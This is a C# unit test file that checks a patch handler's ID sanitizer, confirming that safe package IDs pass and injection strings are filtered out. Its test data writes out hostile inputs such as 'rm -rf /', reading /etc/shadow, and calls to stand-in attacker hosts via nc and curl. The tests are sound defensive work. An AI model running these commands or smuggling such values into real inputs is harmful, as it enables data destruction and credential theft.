using System.Reflection;
using FluentAssertions;
using HomeManagement.Agent.Handlers;
using Microsoft.Extensions.Logging.Abstractions;

namespace HomeManagement.Agent.Tests.Handlers;

/// <summary>
/// Tests for <see cref="PatchCommandHandler"/> input validation.
/// Verifies the security fix (NEW-01): strict patch ID sanitization
/// prevents shell metacharacter injection.
/// </summary>
public sealed class PatchCommandHandlerTests
{
    private static readonly PatchCommandHandler Handler =
        new(NullLogger<PatchCommandHandler>.Instance);

    /// <summary>
    /// Invoke the private static SanitizePatchIds method via reflection
    /// since it's the core security gate.
    /// </summary>
    private static string[] SanitizePatchIds(string[]? patchIds)
    {
        var method = typeof(PatchCommandHandler)
            .GetMethod("SanitizePatchIds", BindingFlags.NonPublic | BindingFlags.Static)
            ?? throw new InvalidOperationException("SanitizePatchIds method not found");
        return (string[])method.Invoke(null, [patchIds])!;
    }

    // ── Safe IDs pass through ──

    [Theory]
    [InlineData("vim")]
    [InlineData("openssl")]
    [InlineData("libssl1.1")]
    [InlineData("kernel-5.4.0-80.generic")]
    [InlineData("KB5001234")]
    [InlineData("python3.11")]
    [InlineData("dotnet-runtime-8.0")]
    [InlineData("libc6:amd64")]
    [InlineData("package~1.0")]
    public void SanitizePatchIds_ValidId_PassesThrough(string id)
    {
        var result = SanitizePatchIds([id]);
        result.Should().ContainSingle().Which.Should().Be(id);
    }

    // ── Dangerous IDs filtered ──

    [Theory]
    [InlineData("; rm -rf /")]
    [InlineData("vim && cat /etc/shadow")]
    [InlineData("$(whoami)")]
    [InlineData("`id`")]
    [InlineData("pkg | nc attacker 1234")]
    [InlineData("pkg > /tmp/out")]
    [InlineData("pkg\nnewline")]
    [InlineData("pkg name with spaces")]
    [InlineData("';DROP TABLE patches;--")]
    [InlineData("pkg$(curl http://evil.com)")]
    public void SanitizePatchIds_DangerousId_FilteredOut(string id)
    {
        var result = SanitizePatchIds([id]);
        result.Should().BeEmpty();
    }

    // ── Mixed input ──

    [Fact]
    public void SanitizePatchIds_MixedValidAndInvalid_KeepsOnlyValid()
    {
        var input = new[] { "vim", "; rm -rf /", "openssl", "$(whoami)", "KB5001234" };
        var result = SanitizePatchIds(input);
        result.Should().BeEquivalentTo(["vim", "openssl", "KB5001234"]);
    }

    // ── Edge cases ──

    [Fact]
    public void SanitizePatchIds_Null_ReturnsEmpty()
    {
        var result = SanitizePatchIds(null);
        result.Should().BeEmpty();
    }

    [Fact]
    public void SanitizePatchIds_EmptyArray_ReturnsEmpty()
    {
        var result = SanitizePatchIds([]);
        result.Should().BeEmpty();
    }

    [Fact]
    public void SanitizePatchIds_WhitespaceEntries_FilteredOut()
    {
        var result = SanitizePatchIds(["", " ", "  ", "\t"]);
        result.Should().BeEmpty();
    }

    // ── CommandType ──

    [Fact]
    public void CommandType_ReturnsPatchScan()
    {
        Handler.CommandType.Should().Be("PatchScan");
    }
}
